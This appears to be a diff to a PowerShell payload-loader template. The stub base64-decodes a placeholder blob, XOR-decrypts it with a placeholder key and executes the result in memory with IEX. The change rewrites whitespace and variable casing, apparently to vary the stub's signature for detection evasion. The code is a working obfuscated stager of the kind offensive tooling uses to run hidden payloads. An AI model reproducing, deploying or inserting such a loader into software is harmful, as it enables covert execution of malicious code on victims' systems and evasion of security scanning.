@@ -2,6 +2,6 @@
 $a = "%%DATA%%"
 $b = [System.Convert]::FromBase64String($a)
 for ($x = 0; $x -lt $b.Count; $x++) {
-		$b[$x] = $b[$x] -bxor %%KEY%%
-	}
+                ${B}[${x}] = ${B}[${X}] -bxor %%KEY%%
+        }
 IEX ([System.Text.Encoding]::Unicode.GetString($b))
